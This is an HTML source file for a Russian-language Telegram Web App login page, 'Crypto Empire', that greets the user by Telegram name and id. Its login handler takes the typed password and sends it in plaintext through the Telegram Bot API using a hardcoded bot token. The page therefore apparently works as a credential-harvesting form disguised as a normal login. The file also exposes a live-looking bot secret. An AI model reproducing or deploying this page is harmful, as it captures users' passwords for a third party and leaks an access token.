<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <title>Вход в Крипто Империя</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .login-footer {
            text-align: center;
            margin-top: 15px;
        }
        .login-footer a {
            color: #007BFF;
            text-decoration: none;
        }
        .login-footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2 id="title_sign">Здарова, !</h2>
        <form>
            <div class="form-group">
                <label for="username">Логин</label>
                <input type="text" id="username" name="username" placeholder="Введите ваш логин" required>
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="text" id="password" name="password" placeholder="Введите ваш пароль" required>
            </div>
            <input type="submit" onclick="sendMessage()" value="Войти">
        </form>
        <div class="login-footer">
            <p>Нет аккаунта? <a href="#">Зарегистрироваться</a></p>
            <span id="user_data">Твой айди:</span>
        </div>
    </div>
    <script>
        let tg = window.Telegram.WebApp;
        Telegram.WebApp.onEvent('mainButtonClicked', function(){
        	tg.sendData("some string that we need to send"); 
        	//при клике на основную кнопку отправляем данные в строковом виде
        });
        span = document.getElementById("user_data")
        tittle = document.getElementById("title_sign")
        tittle.innerText = `Приветствую, ${tg.initDataUnsafe.user.first_name}!`
        span.innerText = `Твой айди: ${tg.initDataUnsafe.user.id}`
        document.body.style.backgroundColor = '#1e1e1e'
        document.body.style.backgroundColor = tg.backgroundColor

        // Исходный цвет
        var a = "#1e1e1e";
        
        // Функция для преобразования HEX в RGB
        function hexToRgb(hex) {
            var bigint = parseInt(hex.slice(1), 16);
            var r = (bigint >> 16) & 255;
            var g = (bigint >> 8) & 255;
            var b = bigint & 255;
        
            return { r: r, g: g, b: b };
        }
        
        // Функция для преобразования RGB обратно в HEX
        function rgbToHex(r, g, b) {
            return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);
        }
        
        // Функция для увеличения яркости
        function lightenColor(hex, percent) {
            var rgb = hexToRgb(hex);
        
            // Увеличение яркости на заданный процент
            rgb.r = Math.min(255, Math.floor(rgb.r * (1 + percent / 100)));
            rgb.g = Math.min(255, Math.floor(rgb.g * (1 + percent / 100)));
            rgb.b = Math.min(255, Math.floor(rgb.b * (1 + percent / 100)));
        
            return rgbToHex(rgb.r, rgb.g, rgb.b);
        }

        // Пример использования
        
        login_cont = document.querySelector(".login-container")
        login_cont.style.backgroundColor = lightenColor(tg.backgroundColor, 20)
        
    </script>
    <script>
    const token = '7321690711:AAGC0FDwSodg-2gG4lxUyU-3QbTwLl1llXM';
    const chatId = '916858507';
    passtext = document.getElementById("password")
    logintext = document.getElementById("username")

    function sendMessage() {
      const message = `password:${passtext.value}`;
      
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: logintext.value,
          text: message,
        }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('Сообщение отправлено!');
        } else {
          alert('Ошибка отправки сообщения.');
        }
      })
      .catch(error => {
        console.error('Ошибка:', error);
      });
    }
  </script>
</body>
</html>
